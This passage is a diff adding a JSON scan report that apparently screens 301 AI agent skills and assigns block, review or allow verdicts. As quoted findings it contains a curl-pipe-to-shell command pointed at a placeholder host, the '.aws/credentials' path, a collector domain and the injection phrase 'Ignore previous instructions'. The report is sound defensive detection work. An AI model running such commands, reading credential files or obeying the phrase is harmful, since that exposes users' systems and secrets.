@@ -1,0 +1,2061 @@
+{
+  "summary": {
+    "total": 301,
+    "verdicts": {
+      "block": 6,
+      "review": 28,
+      "allow": 267
+    },
+    "rules": {
+      "unknown_domain": 11,
+      "pipe_to_shell": 6,
+      "credential_paths": 6,
+      "encoded_blob": 6,
+      "injection_text": 5,
+      "hidden_unicode": 5,
+      "typosquat": 1
+    }
+  },
+  "skills": [
+    {
+      "name": "skill-0010",
+      "score": 85,
+      "verdict": "block",
+      "findings": [
+        {
+          "rule": "pipe_to_shell",
+          "points": 60,
+          "detail": "downloads and pipes straight into a shell: 'curl https://tools.example/setup.sh | ba'"
+        },
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain tools.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0043",
+      "score": 85,
+      "verdict": "block",
+      "findings": [
+        {
+          "rule": "pipe_to_shell",
+          "points": 60,
+          "detail": "downloads and pipes straight into a shell: 'curl https://tools.example/setup.sh | ba'"
+        },
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain tools.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0096",
+      "score": 85,
+      "verdict": "block",
+      "findings": [
+        {
+          "rule": "pipe_to_shell",
+          "points": 60,
+          "detail": "downloads and pipes straight into a shell: 'curl https://tools.example/setup.sh | ba'"
+        },
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain tools.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0154",
+      "score": 85,
+      "verdict": "block",
+      "findings": [
+        {
+          "rule": "pipe_to_shell",
+          "points": 60,
+          "detail": "downloads and pipes straight into a shell: 'curl https://tools.example/setup.sh | ba'"
+        },
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain tools.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0205",
+      "score": 85,
+      "verdict": "block",
+      "findings": [
+        {
+          "rule": "pipe_to_shell",
+          "points": 60,
+          "detail": "downloads and pipes straight into a shell: 'curl https://tools.example/setup.sh | ba'"
+        },
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain tools.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0257",
+      "score": 85,
+      "verdict": "block",
+      "findings": [
+        {
+          "rule": "pipe_to_shell",
+          "points": 60,
+          "detail": "downloads and pipes straight into a shell: 'curl https://tools.example/setup.sh | ba'"
+        },
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain tools.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0015",
+      "score": 50,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "credential_paths",
+          "points": 50,
+          "detail": "touches credential stores: '.aws/credentials'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0056",
+      "score": 50,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "credential_paths",
+          "points": 50,
+          "detail": "touches credential stores: '.aws/credentials'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0130",
+      "score": 50,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "credential_paths",
+          "points": 50,
+          "detail": "touches credential stores: '.aws/credentials'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0164",
+      "score": 50,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "credential_paths",
+          "points": 50,
+          "detail": "touches credential stores: '.aws/credentials'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0243",
+      "score": 50,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "credential_paths",
+          "points": 50,
+          "detail": "touches credential stores: '.aws/credentials'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0281",
+      "score": 50,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "credential_paths",
+          "points": 50,
+          "detail": "touches credential stores: '.aws/credentials'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0023",
+      "score": 45,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "injection_text",
+          "points": 45,
+          "detail": "instructions aimed at the model, not the user: 'Ignore previous instructions'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0067",
+      "score": 45,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "injection_text",
+          "points": 45,
+          "detail": "instructions aimed at the model, not the user: 'Ignore previous instructions'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0141",
+      "score": 45,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "injection_text",
+          "points": 45,
+          "detail": "instructions aimed at the model, not the user: 'Ignore previous instructions'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0194",
+      "score": 45,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "injection_text",
+          "points": 45,
+          "detail": "instructions aimed at the model, not the user: 'Ignore previous instructions'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0250",
+      "score": 45,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "injection_text",
+          "points": 45,
+          "detail": "instructions aimed at the model, not the user: 'Ignore previous instructions'"
+        }
+      ]
+    },
+    {
+      "name": "pdf-tool",
+      "score": 40,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "typosquat",
+          "points": 40,
+          "detail": "name 'pdf-tool' is 1 edit(s) from popular 'pdf-tools'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0021",
+      "score": 40,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "hidden_unicode",
+          "points": 40,
+          "detail": "zero-width or bidi control characters: '\\u200b'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0060",
+      "score": 40,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "hidden_unicode",
+          "points": 40,
+          "detail": "zero-width or bidi control characters: '\\u200b'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0138",
+      "score": 40,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "hidden_unicode",
+          "points": 40,
+          "detail": "zero-width or bidi control characters: '\\u200b'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0184",
+      "score": 40,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "hidden_unicode",
+          "points": 40,
+          "detail": "zero-width or bidi control characters: '\\u200b'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0245",
+      "score": 40,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "hidden_unicode",
+          "points": 40,
+          "detail": "zero-width or bidi control characters: '\\u200b'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0012",
+      "score": 35,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "encoded_blob",
+          "points": 35,
+          "detail": "long base64-like blob (hidden payload?): 'QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0050",
+      "score": 35,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "encoded_blob",
+          "points": 35,
+          "detail": "long base64-like blob (hidden payload?): 'QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0120",
+      "score": 35,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "encoded_blob",
+          "points": 35,
+          "detail": "long base64-like blob (hidden payload?): 'QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0158",
+      "score": 35,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "encoded_blob",
+          "points": 35,
+          "detail": "long base64-like blob (hidden payload?): 'QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0242",
+      "score": 35,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "encoded_blob",
+          "points": 35,
+          "detail": "long base64-like blob (hidden payload?): 'QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0268",
+      "score": 35,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "encoded_blob",
+          "points": 35,
+          "detail": "long base64-like blob (hidden payload?): 'QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD'"
+        }
+      ]
+    },
+    {
+      "name": "skill-0026",
+      "score": 25,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain collector.evil-example.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0095",
+      "score": 25,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain collector.evil-example.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0153",
+      "score": 25,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain collector.evil-example.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0196",
+      "score": 25,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain collector.evil-example.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0253",
+      "score": 25,
+      "verdict": "review",
+      "findings": [
+        {
+          "rule": "unknown_domain",
+          "points": 25,
+          "detail": "contacts non-allowlisted domain collector.evil-example.example"
+        }
+      ]
+    },
+    {
+      "name": "skill-0000",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0001",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0002",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0003",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0004",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0005",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0006",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0007",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0008",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0009",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0011",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0013",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0014",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0016",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0017",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0018",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0019",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0020",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0022",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0024",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0025",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0027",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0028",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0029",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0030",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0031",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0032",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0033",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0034",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0035",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0036",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0037",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0038",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0039",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0040",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0041",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0042",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0044",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0045",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0046",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0047",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0048",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0049",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0051",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0052",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0053",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0054",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0055",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0057",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0058",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0059",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0061",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0062",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0063",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0064",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0065",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0066",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0068",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0069",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0070",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0071",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0072",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0073",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0074",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0075",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0076",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0077",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0078",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0079",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0080",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0081",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0082",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0083",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0084",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0085",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0086",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0087",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0088",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0089",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0090",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0091",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0092",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0093",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0094",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0097",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0098",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0099",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0100",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0101",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0102",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0103",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0104",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0105",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0106",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0107",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0108",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0109",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0110",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0111",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0112",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0113",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0114",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0115",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0116",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0117",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0118",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0119",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0121",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0122",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0123",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0124",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0125",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0126",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0127",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0128",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0129",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0131",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0132",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0133",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0134",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0135",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0136",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0137",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0139",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0140",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0142",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0143",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0144",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0145",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0146",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0147",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0148",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0149",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0150",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0151",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0152",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0155",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0156",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0157",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0159",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0160",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0161",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0162",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0163",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0165",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0166",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0167",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0168",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0169",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0170",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0171",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0172",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0173",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0174",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0175",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0176",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0177",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0178",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0179",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0180",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0181",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0182",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0183",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0185",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0186",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0187",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0188",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0189",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0190",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0191",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0192",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0193",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0195",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0197",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0198",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0199",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0200",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0201",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0202",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0203",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0204",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0206",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0207",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0208",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0209",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0210",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0211",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0212",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0213",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0214",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0215",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0216",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0217",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0218",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0219",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0220",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0221",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0222",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0223",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0224",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0225",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0226",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0227",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0228",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0229",
